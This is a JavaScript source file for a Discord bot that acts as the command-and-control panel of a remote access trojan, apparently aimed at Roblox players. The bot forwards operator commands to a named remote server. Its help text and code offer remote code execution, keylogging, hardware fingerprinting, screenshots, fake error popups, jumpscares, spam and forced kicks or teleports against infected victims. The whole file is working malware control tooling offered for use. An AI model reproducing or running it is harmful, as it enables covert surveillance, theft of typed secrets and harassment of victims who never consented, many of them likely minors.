const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fetch = require('node-fetch');
const express = require('express');

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const SERVER_URL = process.env.SERVER_URL || "https://ratserver-6wo3.onrender.com";
const PORT = process.env.PORT || 3000;

console.log('🚀 RAT Discord Bot v3.2 запускается...');

if (!DISCORD_TOKEN) {
    console.error('❌ DISCORD_TOKEN не установлен!');
    process.exit(1);
}

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ] 
});

const app = express();

app.get('/', (req, res) => {
    res.json({
        status: 'online',
        bot: client.user?.tag || 'starting',
        server: SERVER_URL,
        version: '3.2.0',
        timestamp: new Date().toISOString()
    });
});

app.get('/health', (req, res) => {
    res.send('OK');
});

async function sendCommand(command, args = [], target = null) {
    try {
        const payload = { command, args };
        if (target) payload.target = target;
        
        console.log(`📨 Отправка: ${command} для ${target || 'всех игроков'}`);
        
        const response = await fetch(`${SERVER_URL}/command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        
        return response.ok;
    } catch (error) {
        console.error('❌ Ошибка отправки:', error.message);
        return false;
    }
}

async function getOnlineUsers() {
    try {
        const response = await fetch(`${SERVER_URL}/users`);
        return await response.json();
    } catch (error) {
        console.error('❌ Ошибка получения пользователей:', error.message);
        return { users: [], count: 0 };
    }
}

async function getServerStatus() {
    try {
        const response = await fetch(`${SERVER_URL}/status`);
        return await response.json();
    } catch (error) {
        console.error('❌ Ошибка получения статуса:', error.message);
        return null;
    }
}

client.on('ready', () => {
    console.log(`\n✅ БОТ УСПЕШНО ЗАПУЩЕН!`);
    console.log(`🤖 Имя: ${client.user.tag}`);
    console.log(`👥 Серверов: ${client.guilds.cache.size}`);
    console.log(`\n📝 Доступные команды:`);
    console.log(`• /test - Проверка связи`);
    console.log(`• /users - Онлайн игроки`);
    console.log(`• /status - Статус системы`);
    console.log(`• /help - Все команды (28 функций)`);
    console.log(`\n⚡ Бот готов к работе!`);
    
    client.user.setActivity('/help | RAT v3.2', { type: 'PLAYING' });
});

client.on('messageCreate', async message => {
    if (message.author.bot || !message.content.startsWith('/')) return;
    
    console.log(`💬 Команда от ${message.author.tag}: ${message.content}`);
    
    const args = message.content.slice(1).split(' ');
    const command = args.shift().toLowerCase();
    
    // Проверяем есть ли таргет
    let target = null;
    const firstArg = args[0];
    
    if (firstArg && /^[a-zA-Z0-9_]{3,20}$/.test(firstArg)) {
        target = args.shift();
    }
    
    try {
        switch (command) {
            case 'test':
                if (await sendCommand("popup", ["✅ Тест от Discord бота!"], target)) {
                    await message.reply(`✅ Тест отправлен ${target ? `игроку **${target}**` : '**всем игрокам**'}!`);
                } else {
                    await message.reply('❌ Ошибка отправки теста');
                }
                break;
                
            case 'users':
                const userData = await getOnlineUsers();
                
                const userEmbed = new EmbedBuilder()
                    .setTitle('👥 Онлайн игроки')
                    .setColor(0x00ff00);
                
                if (userData.count > 0) {
                    userEmbed.setDescription(`**Всего онлайн:** ${userData.count}`);
                    
                    const userList = userData.users.slice(0, 10).map(u => 
                        `• **${u.player}** - ${u.place || 'Unknown'}`
                    ).join('\n');
                    
                    userEmbed.addFields({
                        name: 'Список игроков:',
                        value: userList + (userData.users.length > 10 ? `\n\n... и еще ${userData.users.length - 10} игроков` : '')
                    });
                } else {
                    userEmbed.setDescription('❌ Нет активных игроков');
                    userEmbed.setColor(0xff0000);
                }
                
                await message.reply({ embeds: [userEmbed] });
                break;
                
            case 'status':
                const statusData = await getServerStatus();
                
                if (!statusData) {
                    await message.reply('❌ Не удалось получить статус сервера');
                    return;
                }
                
                const statusEmbed = new EmbedBuilder()
                    .setTitle('📊 Статус системы RAT v3.2')
                    .setColor(0x7289da)
                    .addFields(
                        { name: '🌐 Сервер API', value: statusData.status === 'online' ? '🟢 Онлайн' : '🔴 Офлайн', inline: true },
                        { name: '👥 Онлайн игроков', value: `\`${statusData.online_users || 0}\``, inline: true },
                        { name: '📨 Очередь команд', value: `\`${statusData.pending_commands || 0}\``, inline: true },
                        { name: '📊 Версия', value: '`3.2.0`', inline: true },
                        { name: '🔗 Ссылка', value: `[Открыть](${SERVER_URL})`, inline: true },
                        { name: '🤖 Discord бот', value: statusData.discord_bot?.status === 'online' ? '🟢 Активен' : '🔴 Неактивен', inline: true }
                    )
                    .setFooter({ text: 'RAT Control System | 28 команд доступно' });
                
                await message.reply({ embeds: [statusEmbed] });
                break;
                
            case 'help':
                const helpEmbed = new EmbedBuilder()
                    .setTitle('🤖 RAT Control Panel v3.2')
                    .setDescription('**Полный список всех команд с поддержкой таргетинга**')
                    .setColor(0x7289da)
                    .addFields(
                        { 
                            name: '🎯 Формат команд:', 
                            value: '• `/команда` - для всех игроков\n• `/команда ник` - для конкретного игрока\n• `/команда ник аргументы` - с параметрами\n\n**Примеры:**\n`/fakeerror текст` - для всех\n`/fakeerror PlayerName текст` - для игрока\n`/cameralock on` - для всех\n`/cameralock PlayerName off` - для игрока', 
                            inline: false 
                        },
                        { 
                            name: '👤 Управление игроком', 
                            value: '`/tpgame [ник] <id места>`\n`/kick [ник] <причина>`\n`/freeze [ник] <секунды>`\n`/void [ник]`\n`/spin [ник]`\n`/fling [ник]`\n`/sit [ник]`\n`/dance [ник]`\n`/cameralock [ник] <on/off>`\n`/camerashake [ник] <секунды> <интенсивность>`', 
                            inline: false 
                        },
                        { 
                            name: '🔊 Аудио/Видео', 
                            value: '`/mute [ник]`\n`/unmute [ник]`\n`/playaudio [ник] <id>`\n`/blur [ник] <секунды>`\n`/screenshot [ник]`', 
                            inline: false 
                        },
                        { 
                            name: '💬 Чат', 
                            value: '`/chat [ник]`\n`/message [ник] <текст>`', 
                            inline: false 
                        },
                        { 
                            name: '👻 Скримеры', 
                            value: '`/jumpscare [ник] <тип>`\n**Типы:** 1=Джефф Килер, 2=Соник.exe', 
                            inline: false 
                        },
                        { 
                            name: '⚙️ Системные', 
                            value: '`/execute [ник] <код>`\n`/fakeerror [ник] <текст>`\n`/keylog [ник]`\n`/stopkeylog [ник]`\n`/hardware [ник]`\n`/hide [ник]`', 
                            inline: false 
                        },
                        { 
                            name: '💥 Spam', 
                            value: '`/memory [ник] <кол-во>`\n`/gallery [ник] <кол-во>`', 
                            inline: false 
                        },
                        { 
                            name: '👥 Информация', 
                            value: '`/users` - онлайн игроки\n`/status` - статус системы\n`/test` - тест\n`/print` - проверка связи', 
                            inline: false 
                        }
                    )
                    .setFooter({ text: `Всего команд: 28 | Сервер: ${SERVER_URL} | Версия: 3.2.0` });
                
                await message.reply({ embeds: [helpEmbed] });
                break;
                
            case 'print':
                if (await sendCommand("print", [], target)) {
                    await message.reply(`✅ Проверка связи отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                }
                break;
                
            case 'tpgame':
                const placeId = args[0];
                if (!placeId || !/^\d+$/.test(placeId)) {
                    await message.reply('❌ Укажите корректный ID места (только цифры)');
                    return;
                }
                if (await sendCommand("tpgame", [placeId], target)) {
                    await message.reply(`✅ Команда телепорта отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}\n**ID места:** ${placeId}`);
                } else {
                    await message.reply('❌ Ошибка отправки команды');
                }
                break;
                
            default:
                const validCommands = [
                    'kick', 'freeze', 'void', 'spin', 'fling', 'sit', 'dance',
                    'mute', 'unmute', 'playaudio', 'blur', 'chat', 'message',
                    'jumpscare', 'cameralock', 'camerashake', 'execute', 'fakeerror',
                    'keylog', 'stopkeylog', 'hardware', 'hide', 'memory', 'gallery',
                    'screenshot', 'tpgame'
                ];
                
                if (validCommands.includes(command)) {
                    if (await sendCommand(command, args, target)) {
                        await message.reply(`✅ Команда \`${command}\` отправлена ${target ? `игроку **${target}**` : '**всем игрокам**'}`);
                    } else {
                        await message.reply('❌ Ошибка отправки команды');
                    }
                } else {
                    await message.reply(`❌ Неизвестная команда \`${command}\`. Используйте \`/help\``);
                }
        }
    } catch (error) {
        console.error('❌ Ошибка обработки команды:', error);
        await message.reply('❌ Внутренняя ошибка бота');
    }
});

app.listen(PORT, async () => {
    console.log(`🌐 HTTP сервер запущен на порту ${PORT}`);
    
    try {
        await client.login(DISCORD_TOKEN);
        console.log('✨ Бот успешно запущен!');
        console.log(`📡 Railway URL: ${process.env.RAILWAY_STATIC_URL || 'Доступен в настройках Railway'}`);
    } catch (error) {
        console.error('❌ Ошибка входа в Discord:', error.message);
        process.exit(1);
    }
});
